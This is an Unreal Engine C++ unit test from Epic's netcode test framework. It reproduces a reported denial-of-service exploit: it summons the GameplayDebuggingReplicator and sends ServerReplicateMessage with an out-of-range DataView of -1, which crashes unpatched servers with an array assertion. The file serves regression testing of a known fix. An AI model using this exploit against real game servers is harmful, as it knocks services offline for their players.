// Copyright 1998-2015 Epic Games, Inc. All Rights Reserved.

#include "NUTUnrealEngine4PCH.h"

#include "UnitTests/UTT61_DebugReplicateData.h"

#include "NUTActor.h"

#include "NUTUtilNet.h"
#include "NUTUtilDebug.h"
#include "UnitTestEnvironment.h"


UClass* UUTT61_DebugReplicateData::RepClass = FindObject<UClass>(ANY_PACKAGE, TEXT("GameplayDebuggingReplicator"));


/**
 * UUTT61_DebugReplicateData
 */

UUTT61_DebugReplicateData::UUTT61_DebugReplicateData(const FObjectInitializer& ObjectInitializer)
	: Super(ObjectInitializer)
	, Replicator(NULL)
	, ExploitFailLog(TEXT("Blank exploit fail log message"))
{
	UnitTestName = TEXT("ReplicateDataCheck");
	UnitTestType = TEXT("DevExploit");

	// Date reflects ReVuln doc, not the date I coded this up
	UnitTestDate = FDateTime(2014, 06, 20);


	UnitTestBugTrackIDs.Add(TEXT("TTP #335193"));
	UnitTestBugTrackIDs.Add(TEXT("TTP #335195"));

	UnitTestBugTrackIDs.Add(TEXT("JIRA UE-4225"));
	UnitTestBugTrackIDs.Add(TEXT("JIRA UE-4209"));


	ExpectedResult.Add(TEXT("ShooterGame"),			EUnitTestVerification::VerifiedFixed);
	ExpectedResult.Add(TEXT("QAGame"),				EUnitTestVerification::VerifiedFixed);
	ExpectedResult.Add(TEXT("UnrealTournament"),	EUnitTestVerification::VerifiedFixed);
	ExpectedResult.Add(TEXT("FortniteGame"),		EUnitTestVerification::VerifiedFixed);

	UnitTestTimeout = 60;


	UnitTestFlags |= (EUnitTestFlags::LaunchServer | EUnitTestFlags::AcceptActors | EUnitTestFlags::NotifyNetActors |
						EUnitTestFlags::AcceptPlayerController | EUnitTestFlags::RequirePlayerController | EUnitTestFlags::SendRPCs |
						EUnitTestFlags::ExpectServerCrash);
}

void UUTT61_DebugReplicateData::InitializeEnvironmentSettings()
{
	BaseServerURL = UnitEnv->GetDefaultMap(UnitTestFlags);
	BaseServerParameters = UnitEnv->GetDefaultServerParameters();
}

bool UUTT61_DebugReplicateData::NotifyAllowNetActor(UClass* ActorClass, bool bActorChannel)
{
	bool bAllow = Super::NotifyAllowNetActor(ActorClass, bActorChannel);

	if (!bAllow)
	{
		if (RepClass != NULL)
		{
			if (ActorClass->IsChildOf(RepClass))
			{
				bAllow = true;
			}
		}
		else
		{
			UNIT_LOG(ELogType::StatusFailure | ELogType::StatusWarning | ELogType::StyleBold,
						TEXT("WARNING: Unit test broken. Could not find class 'GameplayDebuggingReplicator'."));

			VerificationState = EUnitTestVerification::VerifiedNeedsUpdate;
		}
	}

	return bAllow;
}

void UUTT61_DebugReplicateData::NotifyNetActor(UActorChannel* ActorChannel, AActor* Actor)
{
	Super::NotifyNetActor(ActorChannel, Actor);

	if (Replicator == NULL)
	{
		if (RepClass != NULL)
		{
			if (Actor->IsA(RepClass))
			{
				Replicator = Actor;

				if (Replicator != NULL)
				{
					// Once the replicator is found, pass back to the main exploit function
					ExecuteClientUnitTest();
				}
			}
		}
		else
		{
			UNIT_LOG(ELogType::StatusFailure | ELogType::StatusWarning | ELogType::StyleBold,
						TEXT("WARNING: Unit test broken. Could not find class 'GameplayDebuggingReplicator'."));

			VerificationState = EUnitTestVerification::VerifiedNeedsUpdate;
		}
	}
}

void UUTT61_DebugReplicateData::ExecuteClientUnitTest()
{
	// Send a command to spawn the GameplayDebuggingReplicator on the server
	if (!Replicator.IsValid())
	{
		FString LogMsg = TEXT("Sending GameplayDebuggingReplicator summon command");

		ResetTimeout(LogMsg);
		UNIT_LOG(ELogType::StatusImportant, TEXT("%s"), *LogMsg);

		FOutBunch* ControlChanBunch = NUTNet::CreateChannelBunch(ControlBunchSequence, UnitConn, CHTYPE_Control, 0);

		uint8 ControlMsg = NMT_NUTControl;
		uint8 ControlCmd = ENUTControlCommand::Summon;
		FString Cmd = TEXT("GameplayDebugger.GameplayDebuggingReplicator -ForceBeginPlay -GameplayDebuggerHack");

		*ControlChanBunch << ControlMsg;
		*ControlChanBunch << ControlCmd;
		*ControlChanBunch << Cmd;

		NUTNet::SendControlBunch(UnitConn, *ControlChanBunch);
	}
	// Now execute the exploit on the replicator
	else
	{
		FString LogMsg = TEXT("Found replicator - executing exploit");

		ResetTimeout(LogMsg);
		UNIT_LOG(ELogType::StatusImportant, TEXT("%s"), *LogMsg);

		struct ServerReplicateMessageParms
		{
			AActor* Actor;
			uint32 InMessage;
			uint32 DataView;
		};

		ServerReplicateMessageParms Parms;
		Parms.Actor = NULL;
		Parms.InMessage = 4; //EDebugComponentMessage::ActivateDataView;
		Parms.DataView = -1;

		static const FName ServerRepMessageName = FName(TEXT("ServerReplicateMessage"));

		Replicator->ProcessEvent(Replicator->FindFunctionChecked(ServerRepMessageName), &Parms);


		// If the exploit was a failure, the next log message will IMMEDIATELY be the 'ExploitFailLog' message,
		// as that message is triggered within the same code chain as the RPC above
		// (and should be blocked, if the above succeeds).
		FOutBunch* ControlChanBunch = NUTNet::CreateChannelBunch(ControlBunchSequence, UnitConn, CHTYPE_Control, 0);

		uint8 ControlMsg = NMT_NUTControl;
		uint8 ControlCmd = ENUTControlCommand::Command_NoResult;
		FString Cmd = ExploitFailLog;

		*ControlChanBunch << ControlMsg;
		*ControlChanBunch << ControlCmd;
		*ControlChanBunch << Cmd;

		NUTNet::SendControlBunch(UnitConn, *ControlChanBunch);
	}
}

void UUTT61_DebugReplicateData::NotifyProcessLog(TWeakPtr<FUnitTestProcess> InProcess, const TArray<FString>& InLogLines)
{
	Super::NotifyProcessLog(InProcess, InLogLines);

	if (InProcess.HasSameObject(ServerHandle.Pin().Get()))
	{
		const TCHAR* AssertLog = TEXT("appError called: Assertion failed: (Index >= 0) & (Index < ArrayNum)");

		for (auto CurLine : InLogLines)
		{
			if (CurLine.Contains(AssertLog))
			{
				VerificationState = EUnitTestVerification::VerifiedNotFixed;
				break;
			}
			else if (CurLine.Contains(ExploitFailLog))
			{
				VerificationState = EUnitTestVerification::VerifiedFixed;
				break;
			}
		}
	}
}


